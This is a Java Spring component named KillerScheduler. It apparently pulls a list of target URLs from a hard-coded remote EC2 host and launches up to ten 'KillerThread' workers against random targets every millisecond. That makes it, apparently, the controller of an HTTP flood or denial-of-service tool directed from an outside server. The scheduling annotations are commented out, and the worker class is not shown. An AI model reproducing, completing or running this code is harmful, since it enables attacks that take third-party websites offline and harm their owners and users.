package com.killer;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.reflect.TypeToken;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.protocol.HttpClientContext;
import org.apache.http.impl.nio.client.CloseableHttpAsyncClient;
import org.apache.http.impl.nio.client.HttpAsyncClients;
import org.apache.http.impl.nio.conn.PoolingNHttpClientConnectionManager;
import org.apache.http.impl.nio.reactor.DefaultConnectingIOReactor;
import org.apache.http.nio.reactor.ConnectingIOReactor;
import org.apache.http.nio.reactor.IOReactorException;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;

import javax.annotation.PostConstruct;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Type;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.Random;
import java.util.concurrent.Future;

@Component
public class KillerScheduler {

    private static final int THREAD_COUNT = 10;
    private static final String SOURCE_URL = "http://ec2-54-175-39-173.compute-1.amazonaws.com/data";

    Gson gson;
    CloseableHttpAsyncClient client;
    List<String> urls;

//    @PostConstruct
    private void init() throws IOReactorException {
        ConnectingIOReactor ioReactor = new DefaultConnectingIOReactor();
        PoolingNHttpClientConnectionManager cm = new PoolingNHttpClientConnectionManager(ioReactor);
        client = HttpAsyncClients.custom().setConnectionManager(cm).build();
        client.start();

        gson = new GsonBuilder().create();
        urls = initializeUrls();
    }

//    @Scheduled(fixedRate = 300000L)
    public void reInitialize() {
        urls = initializeUrls();
    }

//    @Scheduled(fixedDelay = 1L)
    public void kill() {
        int size = Math.min(THREAD_COUNT, urls.size());
        for (int i = 0; i < size; i++) {
            String url = urls.get(getRandomIndex());
            KillerThread thread = new KillerThread(client, url);
            thread.start();
        }
    }

    private int getRandomIndex() {
        return new Random().nextInt(urls.size());
    }

    private List<String> initializeUrls() {
        try {
            List<String> urls = fetchUrls();
            if (urls == null || urls.isEmpty()) {
                return DefaultUrlHolder.DEFAULT_URLS;
            } else {
                return urls;
            }
        } catch (Exception e) {
            return DefaultUrlHolder.DEFAULT_URLS;
        }
    }

    private List<String> fetchUrls() throws Exception {
        HttpGet request = new HttpGet(SOURCE_URL);
        Future<HttpResponse> future = client.execute(request, HttpClientContext.create(), null);
        HttpResponse response = future.get();

        InputStream stream = response.getEntity().getContent();
        Type type = new TypeToken<List<String>>() {
        }.getType();
        return gson.fromJson(new InputStreamReader(stream, StandardCharsets.UTF_8), type);
    }
}
